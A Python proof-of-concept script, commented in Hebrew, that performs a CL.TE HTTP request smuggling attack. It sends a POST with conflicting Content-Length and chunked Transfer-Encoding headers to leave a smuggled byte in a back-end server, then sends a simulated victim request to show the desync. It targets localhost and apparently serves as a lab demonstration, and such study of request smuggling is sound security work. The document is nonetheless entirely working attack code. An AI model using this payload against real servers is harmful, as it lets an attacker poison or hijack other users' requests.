import socket
import time

# הגדרת כתובת השרת (ה-Frontend שלנו)
TARGET_HOST = '127.0.0.1'
TARGET_PORT = 8080

def send_smuggling_attack():
    # פתיחת חיבור TCP ישיר
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3) # הגדרת פסק זמן כדי שהסקריפט לא ייתקע
    s.connect((TARGET_HOST, TARGET_PORT))

    print("[*] Connected to target...")

    # 1. בניית בקשת התוקף (Malicious Payload)
    # שים לב: אנחנו שולחים את התו "G" מחוץ לגבולות ה-Chunked encoding
    attacker_request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: keep-alive\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G" # התו שיישאר "תקוע" בזיכרון של שרת ה-Backend
    )

    print("[*] Sending malicious CL.TE request...")
    s.sendall(attacker_request.encode('utf-8'))

    try:
        # קבלת התשובה לבקשה הראשונה (אמורה להיות 200 OK)
        response1 = s.recv(4096).decode('utf-8')
        print("[+] Attacker received:")
        print(response1.split('\r\n')[0]) 
    except socket.timeout:
        print("[-] Timeout waiting for first response.")

    # המתנה קלה כדי לדמות את הזמן שלוקח למשתמש התמים הבא להגיע
    print("\n[*] Waiting 1 second for the 'victim' to arrive...")
    time.sleep(1)

    # 2. בניית בקשת הקורבן (Victim Request)
    # זו בקשה לגיטימית לחלוטין שמגיעה על אותו חיבור TCP
    victim_request = (
        "GET / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )

    print("[*] Sending normal request (simulating victim)...")
    s.sendall(victim_request.encode('utf-8'))

    try:
        response2 = s.recv(4096).decode('utf-8')
        print("\n[+] Victim received:")
        print(response2.split('\r\n')[0])
    except socket.timeout:
        print("[-] Timeout waiting for second response.")

    s.close()
    print("\n[*] Attack finished.")

if __name__ == "__main__":
    send_smuggling_attack()